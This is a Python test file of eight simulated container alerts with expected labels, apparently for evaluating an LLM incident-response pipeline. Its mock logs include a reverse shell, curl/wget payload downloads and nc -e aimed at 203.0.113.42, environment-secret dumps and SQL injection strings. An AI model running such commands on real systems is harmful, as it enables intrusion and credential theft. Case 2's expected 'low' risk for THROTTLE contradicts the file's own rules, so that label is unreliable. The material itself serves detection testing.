"""
LLM 품질 평가용 테스트케이스 (8개)
각 케이스는 실제 시나리오 기반 하드코딩 입력 + 정답 레이블로 구성.

정답 정의 가능: action_type, action_risk, threat_level
정답 정의 불가 (별도 평가): confidence(캘리브레이션), root_cause(Claude 판별)
"""

import sys, os
sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))
from pipeline.prompt.builder import SYSTEM_PROMPT

# ── Baseline SYSTEM_PROMPT (few-shot 예제 없는 버전) ────────────────────────
SYSTEM_PROMPT_BASELINE = """You are an AIOps engineer. Analyze Docker container anomaly data and return JSON only. Always respond in English regardless of the input language.

SCHEMA (all fields required):
{
  "root_cause": "<2 sentences>",
  "action_type": "<RESTART|ISOLATE|PAUSE|THROTTLE|NOTIFY|NONE>",
  "action_targets": ["<container name from ALERT>"],
  "action_description": "<one sentence>",
  "threat_level": "<low|medium|high|critical>",
  "action_risk": "<low|medium|high>",
  "evidence": ["<metric observation>", ...],
  "confidence": <0.0-1.0>
}

RULES:
- action_type: RESTART=CPU spike/memory leak (service down), ISOLATE=active network attack/data exfil, PAUSE=container compromise requiring forensic preservation, THROTTLE=transient CPU/memory pressure with service still alive, NOTIFY=ambiguous/needs human review, NONE=false positive or already recovered
- action_risk: low=NOTIFY/NONE only, medium=THROTTLE/SCALE/config, high=RESTART/ISOLATE/PAUSE
- action_targets: MUST match Container field in ALERT. Always an array.
- evidence: 3-5 numeric values from metrics.
"""

# ── 테스트케이스 정의 ─────────────────────────────────────────────────────────
# user_prompt: pipeline의 PromptBuilder._build_user() 결과물과 동일한 포맷
TEST_CASES = [
    # ── CASE 1: CPU 완전 포화 → RESTART ────────────────────────────────────
    {
        "case_id": 1,
        "description": "CPU 완전 포화, HTTP 503 → RESTART",
        "user_prompt": """\
=== ALERT ===
Name     : HighCpuUsage
Severity : critical
Container: leafy-backend
Time     : 2026-06-05T10:00:00Z
Summary  : CPU usage exceeded threshold

=== METRICS (5-min window) ===
cpu_usage: latest=4.93, peak=4.97, samples=30
memory_usage: latest=512000000.0000, peak=520000000.0000, samples=30
host_cpu: latest=0.9200, peak=0.9500, samples=30

=== LOGS (5-min window, up to 50 lines) ===
[leafy-backend] ERROR: Request processing failed - timeout
[leafy-backend] ERROR: HTTP 503 Service Unavailable
[leafy-backend] FATAL: Thread pool exhausted, dropping connections
[leafy-backend] ERROR: OutOfMemoryError: unable to create new native thread
[leafy-backend] ERROR: Connection refused - backend unresponsive

Analyze the above data and respond with JSON only.""",
        "expected": {
            "action_type": "RESTART",
            "action_risk": "high",
            "threat_level": "high",
        },
    },

    # ── CASE 2: CPU 순간 급증 후 정상 → THROTTLE ───────────────────────────
    {
        "case_id": 2,
        "description": "CPU 순간 급증, 서비스 살아있음 → THROTTLE",
        "user_prompt": """\
=== ALERT ===
Name     : HighCpuUsage
Severity : warning
Container: leafy-backend
Time     : 2026-06-05T10:05:00Z
Summary  : CPU usage spike detected

=== METRICS (5-min window) ===
cpu_usage: latest=2.10, peak=2.45, samples=30
memory_usage: latest=310000000.0000, peak=320000000.0000, samples=30
host_cpu: latest=0.4800, peak=0.5200, samples=30

=== LOGS (5-min window, up to 50 lines) ===
[leafy-backend] INFO: GET /api/v1/my-plants - 200 OK (45ms)
[leafy-backend] INFO: GET /api/v1/schedules - 200 OK (38ms)
[leafy-backend] WARN: CPU spike detected, duration=90s
[leafy-backend] INFO: Service health check passed

Analyze the above data and respond with JSON only.""",
        "expected": {
            "action_type": "THROTTLE",
            "action_risk": "low",
            "threat_level": "medium",
        },
    },

    # ── CASE 3: 환경변수 덤프 공격 → PAUSE ─────────────────────────────────
    {
        "case_id": 3,
        "description": "printenv 환경변수 덤프 탐지 → PAUSE",
        "user_prompt": """\
=== ALERT ===
Name     : SecretDumpAttempt
Severity : critical
Container: leafy-backend
Time     : 2026-06-05T10:10:00Z
Summary  : 컨테이너 내부 환경변수 덤프 시도 탐지

=== METRICS (5-min window) ===
cpu_usage: latest=0.12, peak=0.18, samples=30
memory_usage: latest=420000000.0000, peak=425000000.0000, samples=30

=== LOGS (5-min window, up to 50 lines) ===
[leafy-backend] [ATTACK] printenv executed
[leafy-backend] SPRING_DATASOURCE_PASSWORD=***
[leafy-backend] JWT_SECRET=***
[leafy-backend] [ATTACK] env dump - 42 variables exposed
[leafy-backend] [ATTACK] environ dump via /proc/1/environ

Analyze the above data and respond with JSON only.""",
        "expected": {
            "action_type": "PAUSE",
            "action_risk": "high",
            "threat_level": "critical",
        },
    },

    # ── CASE 4: DB 비인가 직접 접속 → ISOLATE ──────────────────────────────
    {
        "case_id": 4,
        "description": "DB 인증 실패 반복, 횡적 이동 → ISOLATE",
        "user_prompt": """\
=== ALERT ===
Name     : UnauthorizedDBAccess
Severity : critical
Container: leafy-db
Time     : 2026-06-05T10:15:00Z
Summary  : 비인가 DB 직접 접속 시도 탐지

=== METRICS (5-min window) ===
cpu_usage: latest=0.08, peak=0.15, samples=30
memory_usage: latest=180000000.0000, peak=185000000.0000, samples=30

=== LOGS (5-min window, up to 50 lines) ===
[leafy-db] FATAL: password authentication failed for user "attacker"
[leafy-db] FATAL: password authentication failed for user "admin"
[leafy-db] FATAL: password authentication failed for user "root"
[leafy-db] FATAL: password authentication failed for user "postgres"
[leafy-db] FATAL: password authentication failed for user "leafy"
[leafy-db] FATAL: password authentication failed for user "leafy" (attempt 50)
[leafy-db] LOG: connection received: host=172.20.0.99 port=54321

Analyze the above data and respond with JSON only.""",
        "expected": {
            "action_type": "ISOLATE",
            "action_risk": "high",
            "threat_level": "critical",
        },
    },

    # ── CASE 5: 알림 발화 but 이미 회복 → NONE ─────────────────────────────
    {
        "case_id": 5,
        "description": "알림 발화됐지만 이미 회복, false positive → NONE",
        "user_prompt": """\
=== ALERT ===
Name     : HighCpuUsage
Severity : warning
Container: leafy-backend
Time     : 2026-06-05T09:52:00Z
Summary  : CPU usage exceeded threshold

=== METRICS (5-min window) ===
cpu_usage: latest=0.08, peak=2.31, samples=30
memory_usage: latest=290000000.0000, peak=295000000.0000, samples=30
host_cpu: latest=0.0300, peak=0.4800, samples=30

=== LOGS (5-min window, up to 50 lines) ===
[leafy-backend] INFO: GET /api/v1/my-plants - 200 OK (12ms)
[leafy-backend] INFO: GET /api/v1/schedules - 200 OK (8ms)
[leafy-backend] INFO: Service health check passed
[leafy-backend] INFO: All systems normal

Analyze the above data and respond with JSON only.""",
        "expected": {
            "action_type": "NONE",
            "action_risk": "low",
            "threat_level": "low",
        },
    },

    # ── CASE 6: SQL Injection 스캔 패턴 → NOTIFY ───────────────────────────
    {
        "case_id": 6,
        "description": "SQLi 스캔 패턴 탐지 (JPA로 차단됨) → NOTIFY",
        "user_prompt": """\
=== ALERT ===
Name     : SQLInjectionAttempt
Severity : warning
Container: leafy-frontend
Time     : 2026-06-05T10:20:00Z
Summary  : SQL Injection 시도 패턴 탐지

=== METRICS (5-min window) ===
cpu_usage: latest=0.45, peak=0.62, samples=30
memory_usage: latest=380000000.0000, peak=390000000.0000, samples=30

=== LOGS (5-min window, up to 50 lines) ===
[leafy-frontend] 172.20.0.1 - - "GET /api/v1/my-plants?userId=' OR '1'='1 HTTP/1.1" 400 -
[leafy-frontend] 172.20.0.1 - - "GET /api/v1/schedules?plantId=' UNION SELECT username,password FROM users-- HTTP/1.1" 400 -
[leafy-frontend] 172.20.0.1 - - "GET /home?search=admin'-- HTTP/1.1" 400 -
[leafy-frontend] 172.20.0.1 - - "GET /api/v1/my-plants?userId=1' AND SLEEP(5)-- HTTP/1.1" 400 -
[leafy-frontend] 172.20.0.1 - - "GET /home?search=' OR 1=1# HTTP/1.1" 400 -

Analyze the above data and respond with JSON only.""",
        "expected": {
            "action_type": "NOTIFY",
            "action_risk": "low",
            "threat_level": "medium",
        },
    },

    # ── CASE 7: 의심스러운 프로세스 실행 (C2 연결 시도) → PAUSE/ISOLATE ────
    {
        "case_id": 7,
        "description": "C2 아웃바운드 연결 + env 탈취 시도 → PAUSE",
        "user_prompt": """\
=== ALERT ===
Name     : SuspiciousProcessExec
Severity : critical
Container: leafy-backend
Time     : 2026-06-05T10:25:00Z
Summary  : 컨테이너 내부 의심 프로세스 실행 탐지 (C2 연결 시도)

=== METRICS (5-min window) ===
cpu_usage: latest=0.22, peak=0.35, samples=30
memory_usage: latest=430000000.0000, peak=440000000.0000, samples=30

=== LOGS (5-min window, up to 50 lines) ===
[leafy-backend] [suspicious_outbound] curl http://203.0.113.42:4444/shell.sh -o /tmp/shell.sh
[leafy-backend] [suspicious_outbound] wget http://203.0.113.42/payload -O /tmp/payload
[leafy-backend] [suspicious_outbound] /bin/bash -i >& /dev/tcp/203.0.113.42/4444 0>&1
[leafy-backend] ERROR: Unexpected process: nc -e /bin/sh 203.0.113.42 4444
[leafy-backend] [ATTACK] printenv executed - credential harvesting

Analyze the above data and respond with JSON only.""",
        "expected": {
            "action_type": "PAUSE",
            "action_risk": "high",
            "threat_level": "critical",
        },
    },

    # ── CASE 8: 메모리 압박, 서비스 응답 느림 → THROTTLE ───────────────────
    {
        "case_id": 8,
        "description": "메모리 압박, OOM 위험 but 서비스 살아있음 → THROTTLE",
        "user_prompt": """\
=== ALERT ===
Name     : HighMemoryUsage
Severity : warning
Container: leafy-backend
Time     : 2026-06-05T10:30:00Z
Summary  : Memory usage exceeded threshold

=== METRICS (5-min window) ===
cpu_usage: latest=1.20, peak=1.45, samples=30
memory_usage: latest=490000000.0000, peak=498000000.0000, samples=30
memory_limit: latest=512000000.0000, peak=512000000.0000, samples=30

=== LOGS (5-min window, up to 50 lines) ===
[leafy-backend] WARN: Memory usage at 95% of limit
[leafy-backend] WARN: GC overhead increasing - major collection triggered
[leafy-backend] INFO: GET /api/v1/my-plants - 200 OK (320ms)
[leafy-backend] WARN: Response time degraded, memory pressure detected
[leafy-backend] INFO: Service still responding but slow

Analyze the above data and respond with JSON only.""",
        "expected": {
            "action_type": "THROTTLE",
            "action_risk": "medium",
            "threat_level": "medium",
        },
    },
]

# 1단계 모델 선택용 대표 케이스 (case_id 기준)
REPRESENTATIVE_CASE_IDS = [1, 3, 4, 5]  # RESTART, PAUSE, ISOLATE, NONE
